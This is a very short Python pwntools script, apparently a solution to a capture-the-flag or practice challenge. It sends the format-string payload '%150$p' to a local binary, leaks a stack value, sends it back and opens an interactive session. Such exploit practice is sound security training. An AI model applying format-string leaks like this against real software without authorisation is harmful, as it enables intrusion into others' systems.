#!/usr/bin/env python
from pwn import *

p = process("./fs-read-2-32")

p.sendline('%150$p')

data = p.recv(0x200)

#print(data)

new_data = data[36:-28]

print(new_data)

p.sendline(new_data)

p.interactive()